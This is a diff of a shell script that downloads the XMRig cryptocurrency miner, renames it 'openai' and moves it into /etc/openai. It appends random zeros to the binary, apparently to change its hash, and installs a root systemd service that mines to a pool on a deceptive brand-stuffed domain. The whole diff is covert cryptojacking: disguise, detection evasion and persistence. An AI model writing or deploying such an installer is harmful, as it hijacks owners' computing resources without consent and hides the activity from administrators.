@@ -6,11 +6,12 @@ wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v$latest/xmrig
 tar -zxvf 1.tar.gz
 mv xmrig-$latest openai
 mv openai/xmrig openai/openai
+mv openai /etc/openai
 rm -rf 1.tar.gz
 cd openai && rm -rf SHA256SUMS
 random_number=$((RANDOM % 188 + 68))
 for i in $(seq 1 $random_number); do
-  echo -n "0" >> /root/openai/openai
+  echo -n "0" >> /etc/openai/openai
 done
 cat > /etc/systemd/system/openai.service <<EOL
 [Unit]
@@ -19,7 +20,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/root/openai/openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $1 -p x
+ExecStart=/etc/openai/openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $1 -p x
 Restart=on-failure
 User=root
 
